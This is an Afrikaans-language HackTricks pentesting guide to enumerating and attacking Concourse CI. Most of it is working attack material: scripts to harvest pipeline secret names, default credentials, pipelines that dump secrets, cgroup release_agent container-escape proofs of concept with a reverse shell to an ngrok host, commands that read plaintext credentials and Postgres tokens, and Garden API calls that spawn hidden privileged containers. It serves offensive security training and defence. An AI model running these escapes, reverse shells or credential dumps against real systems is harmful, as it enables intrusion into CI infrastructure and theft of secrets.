# Concourse Enumeration & Attacks

## Concourse Enumeration & Attacks

{% hint style="success" %}
Leer en oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer en oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**intekenplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repo's.

</details>
{% endhint %}

### Gebruikersrolle & Toestemmings

Concourse kom met vyf rolle:

* _Concourse_ **Admin**: Hierdie rol word slegs gegee aan eienaars van die **hoofspan** (standaard aanvanklike concourse-span). Admins kan **ander spanne konfigureer** (bv.: `fly set-team`, `fly destroy-team`...). Die toestemmings van hierdie rol kan nie deur RBAC be√Ønvloed word nie.
* **eienaar**: Spaneienaars kan **alles binne die span verander**.
* **lid**: Spanlede kan **lees en skryf** binne die **span se bates** maar kan nie die spaninstellings verander nie.
* **pipeline-operator**: Pipeline-operateurs kan **pipeline-operasies** uitvoer soos om bouwerk te begin en hulpbronne vas te pen, maar hulle kan nie pipeline-konfigurasies opdateer nie.
* **kyker**: Spankykers het **"slegs-lees" toegang tot 'n span** en sy pipelines.

{% hint style="info" %}
Boonop kan die **toestemmings van die rolle eienaar, lid, pipeline-operator en kyker verander word** deur RBAC te konfigureer (meer spesifiek sy aksies te konfigureer). Lees meer daaroor by: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Let daarop dat Concourse **groepeer pipelines binne Spanne**. Daarom sal gebruikers wat aan 'n Span behoort daardie pipelines kan bestuur en **verskeie Spanne** kan bestaan. 'n Gebruiker kan aan verskeie Spanne behoort en verskillende toestemmings binne elkeen h√™.

### Vars & Kredietbestuurder

In die YAML-konfigurasies kan jy waardes konfigureer met behulp van die sintaksis `((_source-name_:_secret-path_._secret-field_))`.\
[Van die dokumentasie:](https://concourse-ci.org/vars.html#var-syntax) Die **source-name is opsioneel**, en as dit weggelaat word, sal die [cluster-wye kredietbestuurder](https://concourse-ci.org/vars.html#cluster-wide-credential-manager) gebruik word, of die waarde kan [staties](https://concourse-ci.org/vars.html#static-vars) verskaf word.\
Die **opsionele \_secret-field**\_ spesifiseer 'n veld op die opgehaalde geheim om te lees. As dit weggelaat word, kan die kredietbestuurder kies om 'n 'standaardveld' van die opgehaalde krediet te lees as die veld bestaan.\
Boonop kan die _**secret-path**_ en _**secret-field**_ omring word deur dubbel aanhalings `"..."` as hulle **spesiale karakters** soos `.` en `:` bevat. Byvoorbeeld, `((source:"my.secret"."field:1"))` sal die _secret-path_ stel na `my.secret` en die _secret-field_ na `field:1`.

#### Statiese Vars

Statiese vars kan gespesifiseer word in **taakstappe**:
```yaml
- task: unit-1.13
file: booklit/ci/unit.yml
vars: {tag: 1.13}
```
Of gebruik die volgende `fly` **argumente**:

* `-v` of `--var` `NAME=VALUE` stel die string `VALUE` as die waarde vir die var `NAME`.
* `-y` of `--yaml-var` `NAME=VALUE` parseer `VALUE` as YAML en stel dit as die waarde vir die var `NAME`.
* `-i` of `--instance-var` `NAME=VALUE` parseer `VALUE` as YAML en stel dit as die waarde vir die instance var `NAME`. Sien [Grouping Pipelines](https://concourse-ci.org/instanced-pipelines.html) om meer te leer oor instance vars.
* `-l` of `--load-vars-from` `FILE` laai `FILE`, 'n YAML-dokument wat var name na waardes karteer, en stel hulle almal.

#### Kredensiaalbestuur

Daar is verskillende maniere waarop 'n **Kredensiaalbestuurder gespesifiseer kan word** in 'n pipeline, lees hoe by [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
Boonop ondersteun Concourse verskillende kredensiaalbestuurders:

* [The Vault credential manager](https://concourse-ci.org/vault-credential-manager.html)
* [The CredHub credential manager](https://concourse-ci.org/credhub-credential-manager.html)
* [The AWS SSM credential manager](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [The AWS Secrets Manager credential manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [Kubernetes Credential Manager](https://concourse-ci.org/kubernetes-credential-manager.html)
* [The Conjur credential manager](https://concourse-ci.org/conjur-credential-manager.html)
* [Caching credentials](https://concourse-ci.org/creds-caching.html)
* [Redacting credentials](https://concourse-ci.org/creds-redacting.html)
* [Retrying failed fetches](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Let daarop dat as jy enige vorm van **skryf toegang tot Concourse** het, jy werk kan skep om **daardie geheime uit te voer** aangesien Concourse toegang daartoe moet h√™.
{% endhint %}

### Concourse Enumerasie

Om 'n concourse-omgewing te enumereer, moet jy eers **geldige geloofsbriewe versamel** of 'n **geauthentiseerde token** vind, waarskynlik in 'n `.flyrc` konfigurasiel√™er.

#### Aanmelding en Huidige Gebruiker enum

* Om aan te meld moet jy die **eindpunt**, die **span naam** (standaard is `main`) en 'n **span waaraan die gebruiker behoort** ken:
* `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
* Kry geconfigureerde **teikens**:
* `fly targets`
* Kry of die geconfigureerde **teikenverbinding** nog **geldig** is:
* `fly -t <target> status`
* Kry **rol** van die gebruiker teen die aangeduide teiken:
* `fly -t <target> userinfo`

{% hint style="info" %}
Let daarop dat die **API-token** **gestoor** word in `$HOME/.flyrc` by verstek, jy kan 'n masjien plunder en daar die geloofsbriewe vind.
{% endhint %}

#### Spanne & Gebruikers

* Kry 'n lys van die Spanne
* `fly -t <target> teams`
* Kry rolle binne span
* `fly -t <target> get-team -n <team-name>`
* Kry 'n lys van gebruikers
* `fly -t <target> active-users`

#### Pipelines

* **Lys** pipelines:
* `fly -t <target> pipelines -a`
* **Kry** pipeline yaml (**sensitiewe inligting** kan in die definisie gevind word):
* `fly -t <target> get-pipeline -p <pipeline-name>`
* Kry alle pipeline **konfigurasie verklaarde vars**
* `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
* Kry al die **pipelines geheime name wat gebruik word** (as jy 'n werk kan skep/wysig of 'n houer kan kaap, kan jy hulle uitvoer):
```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do
echo $pipename;
fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```
#### Containers & Workers

* Lys **workers**:
* `fly -t <target> workers`
* Lys **containers**:
* `fly -t <target> containers`
* Lys **builds** (om te sien wat aan die gang is):
* `fly -t <target> builds`

### Concourse Aanvalle

#### Geloofsbriewe Brute-Force

* admin:admin
* test:test

#### Geheimenisse en parameters enumerasie

In die vorige afdeling het ons gesien hoe jy **al die geheime name en veranderlikes** wat deur die pyplyn gebruik word, kan kry. Die **veranderlikes mag sensitiewe inligting bevat** en die naam van die **geheime sal later nuttig wees om te probeer steel**.

#### Sessie binne lopende of onlangs lopende houer

As jy genoeg voorregte het (**lidrol of meer**) sal jy in staat wees om **pyplyne en rolle te lys** en net 'n **sessie binne** die `<pipeline>/<job>` **houer** te kry deur:
```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```
Met hierdie toestemmings kan jy dalk:

* **Steel die geheime** binne die **houer**
* Probeer om te **ontsnap** na die node
* Enumerateer/Misbruik **cloud metadata** eindpunt (van die pod en van die node, indien moontlik)

#### Pyplyn Skepping/Wysiging

As jy genoeg voorregte het (**lidrol of meer**) sal jy in staat wees om **nuwe pypleidings te skep/wysig.** Kyk na hierdie voorbeeld:
```yaml
jobs:
- name: simple
plan:
- task: simple-task
privileged: true
config:
# Tells Concourse which type of worker this task should run on
platform: linux
image_resource:
type: registry-image
source:
repository: busybox # images are pulled from docker hub by default
run:
path: sh
args:
- -cx
- |
echo "$SUPER_SECRET"
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```
Met die **modifikasie/skep** van 'n nuwe pyplyn sal jy in staat wees om:

* **Steel** die **geheime** (deur hulle uit te eggo of binne die houer te kom en `env` te hardloop)
* **Ontsnap** na die **node** (deur jou genoeg voorregte te gee - `privileged: true`)
* Enumerasie/Misbruik **cloud metadata** eindpunt (van die pod en van die node)
* **Vee** geskepte pyplyn uit

#### Voer Pasgemaakte Taak Uit

Dit is soortgelyk aan die vorige metode, maar in plaas daarvan om 'n hele nuwe pyplyn te modifiseer/skep, kan jy **net 'n pasgemaakte taak uitvoer** (wat waarskynlik baie meer **stealthier** sal wees):
```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
type: registry-image
source:
repository: ubuntu
run:
path: sh
args:
- -cx
- |
env
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```
#### Ontsnap na die node vanaf bevoorregte taak

In die vorige afdelings het ons gesien hoe om 'n **bevoorregte taak met concourse uit te voer**. Dit sal nie vir die houer presies dieselfde toegang gee as die bevoorregte vlag in 'n docker-houer nie. Byvoorbeeld, jy sal nie die node-l√™erstelseltoestel in /dev sien nie, so die ontsnapping kan meer "kompleks" wees.

In die volgende PoC gaan ons die release\_agent gebruik om te ontsnap met 'n paar klein aanpassings:
```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% hint style="warning" %}
Soos jy dalk opgemerk het, is dit net 'n [**gewone release\_agent ontsnapping**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/concourse-security/broken-reference/README.md) wat net die pad van die cmd in die node verander
{% endhint %}

#### Ontsnap na die node vanaf 'n Worker-houer

'n Gewone release\_agent ontsnapping met 'n klein verandering is genoeg hiervoor:
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
#### Ontsnap na die node vanaf die Web-houer

Selfs al het die web-houer sommige verdediging gedeaktiveer, is dit **nie 'n algemene geprivilegeerde houer** nie (byvoorbeeld, jy **kan nie** **mount** nie en die **vermo√´ns** is baie **beperk**, so al die maklike maniere om uit die houer te ontsnap is nutteloos).

Dit stoor egter **lokale geloofsbriewe in duidelike teks**:
```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```
Jy kan daardie geloofsbriewe gebruik om **teen die webbediener aan te meld** en **'n bevoorregte houer te skep en na die knooppunt te ontsnap**.

In die omgewing kan jy ook inligting vind om **toegang tot die postgresql** instansie wat concourse gebruik (adres, **gebruikersnaam**, **wagwoord** en databasis onder andere inligting):
```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```
#### Misbruik van Garden-diens - Nie 'n werklike Aanval nie

{% hint style="warning" %}
Hierdie is net 'n paar interessante aantekeninge oor die diens, maar omdat dit net op localhost luister, sal hierdie aantekeninge geen impak h√™ wat ons nie alreeds uitgebuit het nie.
{% endhint %}

Elke concourse-werker sal standaard 'n [**Garden**](https://github.com/cloudfoundry/garden) diens op poort 7777 laat loop. Hierdie diens word deur die Web meester gebruik om die werker aan te dui **wat hy moet uitvoer** (laai die beeld af en voer elke taak uit). Dit klink baie goed vir 'n aanvaller, maar daar is 'n paar goeie beskermings:

* Dit is net **lokaal blootgestel** (127.0.0.1) en ek dink wanneer die werker teenoor die Web met die spesiale SSH-diens verifieer, word 'n tonnel geskep sodat die webbediener **met elke Garden-diens** binne elke werker kan praat.
* Die webbediener **monitor die lopende houers elke paar sekondes**, en **onverwagte** houers word **verwyder**. Dus, as jy 'n **pasgemaakte houer wil laat loop**, moet jy **knoei** met die **kommunikasie** tussen die webbediener en die garden-diens.

Concourse-werkers loop met ho√´ houer-voorregte:
```
Container Runtime: docker
Has Namespaces:
pid: true
user: false
AppArmor Profile: kernel
Capabilities:
BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```
Maar, tegnieke soos om die /dev toestel van die node te **mount** of release\_agent **sal nie werk nie** (aangesien die werklike toestel met die l√™erstelsel van die node nie toeganklik is nie, net 'n virtuele een). Ons kan nie toegang kry tot prosesse van die node nie, so om van die node te ontsnap sonder kern-uitbuitings raak ingewikkeld.

{% hint style="info" %}
In die vorige afdeling het ons gesien hoe om van 'n bevoorregte houer te ontsnap, so as ons **opdragte kan uitvoer** in 'n **bevoorregte houer** wat deur die **huidige** **werker** geskep is, kan ons **na die node ontsnap**.
{% endhint %}

Let daarop dat ek opgemerk het dat wanneer 'n nuwe houer geskep word om iets te laat loop, die houerprosesse toeganklik is vanaf die werkerhouer, so dit is soos 'n houer wat 'n nuwe houer binne-in dit skep.

**Om binne 'n lopende bevoorregte houer te kom**
```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
## In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'

# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```
**Skep 'n nuwe bevoorregte houer**

Jy kan baie maklik 'n nuwe houer skep (net 'n ewekansige UID laat loop) en iets daarop uitvoer:
```bash
curl -X POST http://127.0.0.1:7777/containers \
-H 'Content-Type: application/json' \
-d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```
Maar, die webbediener kontroleer elke paar sekondes die houers wat loop, en as 'n onverwagte een ontdek word, sal dit verwyder word. Aangesien die kommunikasie in HTTP plaasvind, kan jy die kommunikasie manipuleer om die verwydering van onverwagte houers te vermy:
```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```
## Verwysings

* https://concourse-ci.org/vars.html

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**intekenplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
